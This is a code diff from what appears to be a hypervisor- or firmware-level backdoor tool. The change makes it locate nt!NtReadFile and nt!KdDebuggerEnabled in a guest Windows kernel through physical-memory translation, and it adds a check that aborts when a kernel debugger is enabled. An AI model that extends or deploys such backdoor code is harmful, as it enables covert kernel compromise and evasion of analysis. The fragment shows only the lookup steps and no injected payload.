@@ -422,14 +422,17 @@ _nt_found:
         goto _end;
     }
 
-    uint64_t nt_func_virt = 0;
-    uint64_t nt_func_phys = 0;
+    uint64_t nt_func_virt = 0, nt_kd_virt = 0;
+    uint64_t nt_func_phys = 0, nt_kd_phys = 0;
+    uint64_t debugger_enabled = 0;
 
     nt_size = _ALIGN_UP(nt_size, PAGE_SIZE);
 
     void *nt_image = malloc(nt_size);
     if (nt_image)
     {
+        uint32_t rva = 0;
+
         memset(nt_image, 0, nt_size);
 
         for (uint32_t i = 0; i < nt_size; i += PAGE_SIZE)
@@ -454,8 +457,7 @@ _nt_found:
             }                
         }
 
-        uint32_t rva = LdrGetProcAddress(nt_image, "NtReadFile");
-        if (rva == 0)
+        if ((rva = LdrGetProcAddress(nt_image, "NtReadFile")) == 0)
         {
             printf("ERROR: Unable to locate nt!NtReadFile()\n");
 
@@ -463,16 +465,37 @@ _nt_found:
             goto _end;   
         }
 
+        // get nt!NtReadFile() virtual address
         nt_func_virt = nt_base_virt + rva;
-
         m_quiet = true;    
 
+        // get nt!NtReadFile() physical address
         if (backdoor_virt_translate(nt_func_virt, &nt_func_phys, guest_pml4_addr, pml4_addr) != 0)
         {
             m_quiet = false;
                 
             free(nt_image);
             goto _end; 
+        }
+
+        // get nt!KdDebuggerEnabled virtual address
+        if ((rva = LdrGetProcAddress(nt_image, "KdDebuggerEnabled")) == 0)
+        {
+            printf("ERROR: Unable to locate nt!KdDebuggerEnabled()\n");
+
+            free(nt_image);
+            goto _end;
+        }
+
+        nt_kd_virt = nt_base_virt + rva;
+
+        // get nt!KdDebuggerEnabled physical address
+        if (backdoor_virt_translate(nt_kd_virt, &nt_kd_phys, guest_pml4_addr, pml4_addr) != 0)
+        {
+            m_quiet = false;
+
+            free(nt_image);
+            goto _end;
         }
 
         m_quiet = false;
@@ -484,9 +507,15 @@ _nt_found:
         goto _end;
     }
 
-    if (nt_func_virt == 0 || nt_func_phys == 0)
+    // get nt!KdDebuggerEnabled value
+    if (backdoor_phys_read_64(nt_kd_phys, &debugger_enabled) != 0)
     {
-        printf("ERROR: Unable to locate nt!NtReadFile()\n");
+        goto _end;
+    }
+
+    if (debugger_enabled != 0)
+    {
+        printf("ERROR: Can't use PAGEKD section because of enabled kernel debugger\n");
         goto _end;
     }
 
